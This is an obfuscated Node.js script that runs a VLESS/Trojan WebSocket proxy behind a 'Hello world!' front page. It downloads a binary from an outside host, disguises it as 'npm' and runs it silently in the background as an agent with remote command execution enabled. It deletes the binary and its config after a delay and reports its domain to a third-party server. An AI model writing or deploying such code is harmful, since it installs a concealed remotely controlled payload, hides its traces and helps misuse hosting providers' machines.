function _0x1f2a(){const _0x2f9dac=['once','map','npm','length','1280520dHGrKC','catch','1234.abc.com','&path=%2F','crypto','env','writeFileSync','post','https://','buffer','path','https://arm64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','/bin/bash','write','every','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','20aSMyNr','133DLMmPf','--tls','close','\x20-p\x20','unlink','NEZHA_KEY','AUTO_ACCESS','error:\x20','Server\x20is\x20running\x20on\x20port\x20','log','slice','chmod\x20+x\x20npm','SUB_PATH','readUInt16BE','Server','listen','update','2087','text/plain','error','net','base64','end','hex','client_secret:\x20','8.8.4.4','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','createServer','http',':443?security=tls&sni=','arm','toString','Failed\x20to\x20resolve\x20','DOMAIN','substr','reduce','writeHead','vless://','text/html','Not\x20Found\x0a','npm\x20running\x20error:','sha224','isp','true','2096','Hello\x20world!','NEZHA_SERVER','WSPATH','application/json','finish',':443?encryption=none&security=tls&sni=','child_process','test','2053','https://api.ip.sb/geoip','createWriteStream','get','axios','npm\x20download\x20successfully','UUID','126158BMGFpv','utf-8','false','406238LjlNDI','data','createHash','npm\x20is\x20running','then','aarch64','\x20with\x20all\x20DNS\x20servers','5317938THzvoZ','443','trim','https://amd64.ssss.nyc.mn/agent','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Automatic\x20Access\x20Task\x20added\x20successfully','105004aRZQBT','replace','arch','country_code','connect','concat','92888leTpyL','split','includes','2083','&type=A','pipe','Answer','npm\x20is\x20already\x20running,\x20skip\x20running...','sub','394971hTaDpe','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','url','8443','type','readFile','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','utf8','join','Status','PORT','readUInt8'];_0x1f2a=function(){return _0x2f9dac;};return _0x1f2a();}const _0x3d6d2f=_0x2d93;(function(_0x51e8c6,_0x100100){const _0x1fed74=_0x2d93,_0x2d6179=_0x51e8c6();while(!![]){try{const _0x25f1be=-parseInt(_0x1fed74(0xae))/0x1+parseInt(_0x1fed74(0xab))/0x2+-parseInt(_0x1fed74(0xca))/0x3+parseInt(_0x1fed74(0xbb))/0x4*(parseInt(_0x1fed74(0xec))/0x5)+parseInt(_0x1fed74(0xda))/0x6+-parseInt(_0x1fed74(0xed))/0x7*(parseInt(_0x1fed74(0xc1))/0x8)+parseInt(_0x1fed74(0xb5))/0x9;if(_0x25f1be===_0x100100)break;else _0x2d6179['push'](_0x2d6179['shift']());}catch(_0x417a08){_0x2d6179['push'](_0x2d6179['shift']());}}}(_0x1f2a,0x34379));const os=require('os'),http=require(_0x3d6d2f(0x109)),fs=require('fs'),axios=require(_0x3d6d2f(0xa8)),net=require(_0x3d6d2f(0x101)),path=require(_0x3d6d2f(0xe4)),crypto=require(_0x3d6d2f(0xde)),{Buffer}=require(_0x3d6d2f(0xe3)),{exec,execSync}=require(_0x3d6d2f(0xa2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3d6d2f(0xaa)]||'cd7e40dc-51f9-4562-9361-021f11429f4a',NEZHA_SERVER=process['env'][_0x3d6d2f(0x9d)]||'',NEZHA_PORT=process[_0x3d6d2f(0xdf)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3d6d2f(0xdf)][_0x3d6d2f(0xf2)]||'',DOMAIN=process[_0x3d6d2f(0xdf)][_0x3d6d2f(0x10e)]||_0x3d6d2f(0xdc),AUTO_ACCESS=process[_0x3d6d2f(0xdf)][_0x3d6d2f(0xf3)]||!![],WSPATH=process[_0x3d6d2f(0xdf)][_0x3d6d2f(0x9e)]||UUID[_0x3d6d2f(0xf7)](0x0,0x8),SUB_PATH=process[_0x3d6d2f(0xdf)][_0x3d6d2f(0xf9)]||_0x3d6d2f(0xc9),NAME=process[_0x3d6d2f(0xdf)]['NAME']||'',PORT=process['env'][_0x3d6d2f(0xd4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x393aa9=_0x3d6d2f;try{const _0x3a608a=await axios['get'](_0x393aa9(0xa5)),_0x5dbc83=_0x3a608a[_0x393aa9(0xaf)];ISP=(_0x5dbc83[_0x393aa9(0xbe)]+'-'+_0x5dbc83[_0x393aa9(0x99)])['replace'](/ /g,'_');}catch(_0x350240){ISP='Unknown';}};GetISP();const httpServer=http[_0x3d6d2f(0x108)]((_0x58c668,_0x112263)=>{const _0x5e6a7e=_0x3d6d2f;if(_0x58c668[_0x5e6a7e(0xcc)]==='/'){const _0x5804db=path[_0x5e6a7e(0xd2)](__dirname,'index.html');fs[_0x5e6a7e(0xcf)](_0x5804db,_0x5e6a7e(0xd1),(_0x865fc3,_0x5c3b34)=>{const _0x1ef52=_0x5e6a7e;if(_0x865fc3){_0x112263[_0x1ef52(0x111)](0xc8,{'Content-Type':_0x1ef52(0x113)}),_0x112263[_0x1ef52(0x103)](_0x1ef52(0x9c));return;}_0x112263[_0x1ef52(0x111)](0xc8,{'Content-Type':_0x1ef52(0x113)}),_0x112263[_0x1ef52(0x103)](_0x5c3b34);});return;}else{if(_0x58c668['url']==='/'+SUB_PATH){const _0x4bcf73=NAME?NAME+'-'+ISP:ISP,_0x5632d1=_0x5e6a7e(0x112)+UUID+'@'+DOMAIN+_0x5e6a7e(0xa1)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5e6a7e(0xdd)+WSPATH+'#'+_0x4bcf73,_0x10e6f3='trojan://'+UUID+'@'+DOMAIN+_0x5e6a7e(0x10a)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5e6a7e(0xdd)+WSPATH+'#'+_0x4bcf73,_0x5a7e27=_0x5632d1+'\x0a'+_0x10e6f3,_0x3d6c02=Buffer['from'](_0x5a7e27)['toString'](_0x5e6a7e(0x102));_0x112263[_0x5e6a7e(0x111)](0xc8,{'Content-Type':_0x5e6a7e(0xff)}),_0x112263[_0x5e6a7e(0x103)](_0x3d6c02+'\x0a');}else _0x112263[_0x5e6a7e(0x111)](0x194,{'Content-Type':'text/plain'}),_0x112263[_0x5e6a7e(0x103)](_0x5e6a7e(0x114));}}),wss=new WebSocket[(_0x3d6d2f(0xfb))]({'server':httpServer}),uuid=UUID[_0x3d6d2f(0xbc)](/-/g,''),DNS_SERVERS=[_0x3d6d2f(0x106),'1.1.1.1'];function resolveHost(_0x57db6b){return new Promise((_0x56bf7e,_0x195f9f)=>{const _0x1075e0=_0x2d93;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1075e0(0xa3)](_0x57db6b)){_0x56bf7e(_0x57db6b);return;}let _0x2c342b=0x0;function _0x7ef83e(){const _0x558e59=_0x1075e0;if(_0x2c342b>=DNS_SERVERS[_0x558e59(0xd9)]){_0x195f9f(new Error(_0x558e59(0x10d)+_0x57db6b+_0x558e59(0xb4)));return;}const _0x3a9f19=DNS_SERVERS[_0x2c342b];_0x2c342b++;const _0x582d00='https://dns.google/resolve?name='+encodeURIComponent(_0x57db6b)+_0x558e59(0xc5);axios['get'](_0x582d00,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x558e59(0xb2)](_0x16481f=>{const _0x35f910=_0x558e59,_0x296e5a=_0x16481f[_0x35f910(0xaf)];if(_0x296e5a[_0x35f910(0xd3)]===0x0&&_0x296e5a[_0x35f910(0xc7)]&&_0x296e5a[_0x35f910(0xc7)]['length']>0x0){const _0x40fcc5=_0x296e5a[_0x35f910(0xc7)]['find'](_0x16f143=>_0x16f143[_0x35f910(0xce)]===0x1);if(_0x40fcc5){_0x56bf7e(_0x40fcc5[_0x35f910(0xaf)]);return;}}_0x7ef83e();})[_0x558e59(0xdb)](_0x281cde=>{_0x7ef83e();});}_0x7ef83e();});}function handleVlessConnection(_0x33cd8b,_0x260fb0){const _0x316e99=_0x3d6d2f,[_0x3800b4]=_0x260fb0,_0xbfc013=_0x260fb0[_0x316e99(0xf7)](0x1,0x11);if(!_0xbfc013[_0x316e99(0xe9)]((_0x179a53,_0x51eb31)=>_0x179a53==parseInt(uuid[_0x316e99(0x10f)](_0x51eb31*0x2,0x2),0x10)))return![];let _0x50c139=_0x260fb0['slice'](0x11,0x12)[_0x316e99(0xd5)]()+0x13;const _0xe166c=_0x260fb0[_0x316e99(0xf7)](_0x50c139,_0x50c139+=0x2)[_0x316e99(0xfa)](0x0),_0x2769f0=_0x260fb0[_0x316e99(0xf7)](_0x50c139,_0x50c139+=0x1)['readUInt8'](),_0x4e9732=_0x2769f0==0x1?_0x260fb0[_0x316e99(0xf7)](_0x50c139,_0x50c139+=0x4)['join']('.'):_0x2769f0==0x2?new TextDecoder()['decode'](_0x260fb0[_0x316e99(0xf7)](_0x50c139+0x1,_0x50c139+=0x1+_0x260fb0[_0x316e99(0xf7)](_0x50c139,_0x50c139+0x1)['readUInt8']())):_0x2769f0==0x3?_0x260fb0['slice'](_0x50c139,_0x50c139+=0x10)[_0x316e99(0x110)]((_0x3a2f64,_0x4c4197,_0x8b6779,_0x2847d1)=>_0x8b6779%0x2?_0x3a2f64[_0x316e99(0xc0)](_0x2847d1['slice'](_0x8b6779-0x1,_0x8b6779+0x1)):_0x3a2f64,[])[_0x316e99(0xd7)](_0x2008c8=>_0x2008c8[_0x316e99(0xfa)](0x0)[_0x316e99(0x10c)](0x10))[_0x316e99(0xd2)](':'):'';_0x33cd8b['send'](new Uint8Array([_0x3800b4,0x0]));const _0xd97e51=createWebSocketStream(_0x33cd8b);return resolveHost(_0x4e9732)['then'](_0x406ff6=>{const _0x1ebeae=_0x316e99;net[_0x1ebeae(0xbf)]({'host':_0x406ff6,'port':_0xe166c},function(){const _0x471e70=_0x1ebeae;this[_0x471e70(0xe8)](_0x260fb0[_0x471e70(0xf7)](_0x50c139)),_0xd97e51['on'](_0x471e70(0x100),()=>{})[_0x471e70(0xc6)](this)['on'](_0x471e70(0x100),()=>{})[_0x471e70(0xc6)](_0xd97e51);})['on'](_0x1ebeae(0x100),()=>{});})[_0x316e99(0xdb)](_0x57ddc6=>{const _0x2a5ec3=_0x316e99;net[_0x2a5ec3(0xbf)]({'host':_0x4e9732,'port':_0xe166c},function(){const _0x1ea9f4=_0x2a5ec3;this[_0x1ea9f4(0xe8)](_0x260fb0['slice'](_0x50c139)),_0xd97e51['on'](_0x1ea9f4(0x100),()=>{})[_0x1ea9f4(0xc6)](this)['on']('error',()=>{})[_0x1ea9f4(0xc6)](_0xd97e51);})['on'](_0x2a5ec3(0x100),()=>{});}),!![];}function handleTrojanConnection(_0x5737ad,_0xbcde72){const _0x49f951=_0x3d6d2f;try{if(_0xbcde72[_0x49f951(0xd9)]<0x3a)return![];const _0x591b87=_0xbcde72[_0x49f951(0xf7)](0x0,0x38)['toString'](),_0x239a0b=[UUID];let _0x39e346=null;for(const _0x3cc38a of _0x239a0b){const _0x621517=crypto[_0x49f951(0xb0)](_0x49f951(0x98))[_0x49f951(0xfd)](_0x3cc38a)['digest'](_0x49f951(0x104));if(_0x621517===_0x591b87){_0x39e346=_0x3cc38a;break;}}if(!_0x39e346)return![];let _0xffa92c=0x38;_0xbcde72[_0xffa92c]===0xd&&_0xbcde72[_0xffa92c+0x1]===0xa&&(_0xffa92c+=0x2);const _0x44201a=_0xbcde72[_0xffa92c];if(_0x44201a!==0x1)return![];_0xffa92c+=0x1;const _0x4f9e87=_0xbcde72[_0xffa92c];_0xffa92c+=0x1;let _0x5c8bb0,_0x3142dd;if(_0x4f9e87===0x1)_0x5c8bb0=_0xbcde72['slice'](_0xffa92c,_0xffa92c+0x4)['join']('.'),_0xffa92c+=0x4;else{if(_0x4f9e87===0x3){const _0x363aac=_0xbcde72[_0xffa92c];_0xffa92c+=0x1,_0x5c8bb0=_0xbcde72['slice'](_0xffa92c,_0xffa92c+_0x363aac)[_0x49f951(0x10c)](),_0xffa92c+=_0x363aac;}else{if(_0x4f9e87===0x4)_0x5c8bb0=_0xbcde72[_0x49f951(0xf7)](_0xffa92c,_0xffa92c+0x10)[_0x49f951(0x110)]((_0x2225d2,_0x5ea3d8,_0x56292e,_0x450ccb)=>_0x56292e%0x2?_0x2225d2[_0x49f951(0xc0)](_0x450ccb[_0x49f951(0xf7)](_0x56292e-0x1,_0x56292e+0x1)):_0x2225d2,[])['map'](_0x450fe2=>_0x450fe2['readUInt16BE'](0x0)[_0x49f951(0x10c)](0x10))[_0x49f951(0xd2)](':'),_0xffa92c+=0x10;else return![];}}_0x3142dd=_0xbcde72['readUInt16BE'](_0xffa92c),_0xffa92c+=0x2;_0xffa92c<_0xbcde72[_0x49f951(0xd9)]&&_0xbcde72[_0xffa92c]===0xd&&_0xbcde72[_0xffa92c+0x1]===0xa&&(_0xffa92c+=0x2);const _0x199f4c=createWebSocketStream(_0x5737ad);return resolveHost(_0x5c8bb0)[_0x49f951(0xb2)](_0x5172f1=>{const _0x4f3de8=_0x49f951;net[_0x4f3de8(0xbf)]({'host':_0x5172f1,'port':_0x3142dd},function(){const _0x5bce28=_0x4f3de8;_0xffa92c<_0xbcde72[_0x5bce28(0xd9)]&&this[_0x5bce28(0xe8)](_0xbcde72[_0x5bce28(0xf7)](_0xffa92c)),_0x199f4c['on'](_0x5bce28(0x100),()=>{})[_0x5bce28(0xc6)](this)['on'](_0x5bce28(0x100),()=>{})[_0x5bce28(0xc6)](_0x199f4c);})['on']('error',()=>{});})['catch'](_0x5b8d74=>{const _0x2656e7=_0x49f951;net[_0x2656e7(0xbf)]({'host':_0x5c8bb0,'port':_0x3142dd},function(){const _0x297184=_0x2656e7;_0xffa92c<_0xbcde72[_0x297184(0xd9)]&&this[_0x297184(0xe8)](_0xbcde72[_0x297184(0xf7)](_0xffa92c)),_0x199f4c['on'](_0x297184(0x100),()=>{})[_0x297184(0xc6)](this)['on'](_0x297184(0x100),()=>{})['pipe'](_0x199f4c);})['on'](_0x2656e7(0x100),()=>{});}),!![];}catch(_0x129b41){return![];}}wss['on']('connection',(_0x173fed,_0x1e1e8a)=>{const _0xba6179=_0x3d6d2f,_0x455d33=_0x1e1e8a[_0xba6179(0xcc)]||'';_0x173fed[_0xba6179(0xd6)](_0xba6179(0xeb),_0x298713=>{const _0x4e5b37=_0xba6179;if(_0x298713[_0x4e5b37(0xd9)]>0x11&&_0x298713[0x0]===0x0){const _0x24c3ba=_0x298713[_0x4e5b37(0xf7)](0x1,0x11),_0xcda8b5=_0x24c3ba[_0x4e5b37(0xe9)]((_0x239275,_0x4fca4c)=>_0x239275==parseInt(uuid[_0x4e5b37(0x10f)](_0x4fca4c*0x2,0x2),0x10));if(_0xcda8b5){!handleVlessConnection(_0x173fed,_0x298713)&&_0x173fed[_0x4e5b37(0xef)]();return;}}!handleTrojanConnection(_0x173fed,_0x298713)&&_0x173fed[_0x4e5b37(0xef)]();})['on'](_0xba6179(0x100),()=>{});});const getDownloadUrl=()=>{const _0x2fc4c7=_0x3d6d2f,_0xa3ca5e=os[_0x2fc4c7(0xbd)]();return _0xa3ca5e===_0x2fc4c7(0x10b)||_0xa3ca5e==='arm64'||_0xa3ca5e===_0x2fc4c7(0xb3)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2fc4c7(0xe5):!NEZHA_PORT?_0x2fc4c7(0xe6):_0x2fc4c7(0xb8);},downloadFile=async()=>{const _0x107252=_0x3d6d2f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x13e999=getDownloadUrl(),_0x3d8bba=await axios({'method':_0x107252(0xa7),'url':_0x13e999,'responseType':'stream'}),_0x2389f3=fs[_0x107252(0xa6)]('npm');return _0x3d8bba[_0x107252(0xaf)][_0x107252(0xc6)](_0x2389f3),new Promise((_0x5dae21,_0x442565)=>{const _0x3628d6=_0x107252;_0x2389f3['on'](_0x3628d6(0xa0),()=>{const _0x51f98a=_0x3628d6;console['log'](_0x51f98a(0xa9)),exec(_0x51f98a(0xf8),_0x46696e=>{if(_0x46696e)_0x442565(_0x46696e);_0x5dae21();});}),_0x2389f3['on'](_0x3628d6(0x100),_0x442565);});}catch(_0x1d8388){throw _0x1d8388;}},runnz=async()=>{const _0x2d9a7b=_0x3d6d2f;try{const _0x976338=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2d9a7b(0xac)});if(_0x976338[_0x2d9a7b(0xb7)]()!==''){console['log'](_0x2d9a7b(0xc8));return;}}catch(_0xb0dfe4){}await downloadFile();let _0xffc58c='',_0x1aa37c=[_0x2d9a7b(0xb6),_0x2d9a7b(0xcd),_0x2d9a7b(0x9b),_0x2d9a7b(0xfe),_0x2d9a7b(0xc4),_0x2d9a7b(0xa4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x270275=_0x1aa37c['includes'](NEZHA_PORT)?_0x2d9a7b(0xee):'';_0xffc58c='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2d9a7b(0xf0)+NEZHA_KEY+'\x20'+_0x270275+_0x2d9a7b(0x107);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x289fdb=NEZHA_SERVER[_0x2d9a7b(0xc3)](':')?NEZHA_SERVER[_0x2d9a7b(0xc2)](':')['pop']():'',_0x4a7817=_0x1aa37c[_0x2d9a7b(0xc3)](_0x289fdb)?_0x2d9a7b(0x9a):_0x2d9a7b(0xad),_0x25a81c=_0x2d9a7b(0x105)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2d9a7b(0xea)+_0x4a7817+_0x2d9a7b(0xb9)+UUID;fs[_0x2d9a7b(0xe0)]('config.yaml',_0x25a81c);}_0xffc58c=_0x2d9a7b(0xd0);}else{console[_0x2d9a7b(0xf6)](_0x2d9a7b(0xcb));return;}}try{exec(_0xffc58c,{'shell':_0x2d9a7b(0xe7)},_0x3ba88b=>{const _0x19693d=_0x2d9a7b;if(_0x3ba88b)console[_0x19693d(0x100)](_0x19693d(0x97),_0x3ba88b);else console[_0x19693d(0xf6)](_0x19693d(0xb1));});}catch(_0x4fc1c9){console['error'](_0x2d9a7b(0xf4)+_0x4fc1c9);}};async function addAccessTask(){const _0x47a91e=_0x3d6d2f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1a594e=_0x47a91e(0xe2)+DOMAIN;try{const _0x121b36=await axios[_0x47a91e(0xe1)]('https://oooo.serv00.net/add-url',{'url':_0x1a594e},{'headers':{'Content-Type':_0x47a91e(0x9f)}});console[_0x47a91e(0xf6)](_0x47a91e(0xba));}catch(_0x142829){}}const delFiles=()=>{const _0x596763=_0x3d6d2f;fs[_0x596763(0xf1)](_0x596763(0xd8),()=>{}),fs['unlink']('config.yaml',()=>{});};function _0x2d93(_0x119946,_0x5b9298){_0x119946=_0x119946-0x97;const _0x1f2a7e=_0x1f2a();let _0x2d9338=_0x1f2a7e[_0x119946];return _0x2d9338;}httpServer[_0x3d6d2f(0xfc)](PORT,()=>{const _0x117b00=_0x3d6d2f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x117b00(0xf6)](_0x117b00(0xf5)+PORT);});
